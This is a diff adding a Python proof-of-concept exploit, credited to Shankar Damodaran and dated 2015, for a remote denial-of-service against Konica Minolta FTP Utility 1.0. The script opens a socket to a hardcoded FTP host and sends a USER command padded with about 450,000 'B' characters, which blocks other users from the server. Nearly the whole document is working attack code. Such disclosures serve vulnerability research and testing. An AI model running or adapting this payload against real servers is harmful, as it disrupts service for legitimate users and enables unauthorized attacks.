@@ -1,0 +1,33 @@
+#!/usr/bin/python
+# Exploit Title: Konica Minolta FTP Utility 1.0 Remote DoS PoC
+# Date: 21-08-2015
+# Exploit Author: Shankar Damodaran
+# Vendor Homepage: http://www.konicaminolta.com/
+# Software Link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
+# Version: 1.0
+# Tested on: Microsoft Windows XP Professional SP3 English
+
+
+import socket
+
+# The ip address of the remote host
+ftphost = '192.168.1.7'
+# The port of the remote host
+ftpport = 21
+
+# Fuzzed packet of a certain length, Appending this to the USER command and requesting the remote ftp server denies requests for other legitimate users. 
+crafted_user_name= "B" * 450012   # DoS
+
+# Establishing connection
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect((ftphost,ftpport))
+s.recv(1024)
+
+# Sending the evil input.
+s.send('USER' + crafted_user_name +'\r\n')
+
+# Once the packet has been sent, the DoS will occur on the remote FTP server. By sending an interrupt through (Ctrl+C), will resume the FTP server from DoS. (Note : The FTP server will not get crashed)
+s.send('QUIT \r\n')	
+s.close()
+
+# End of PoC - Shankar Damodaran
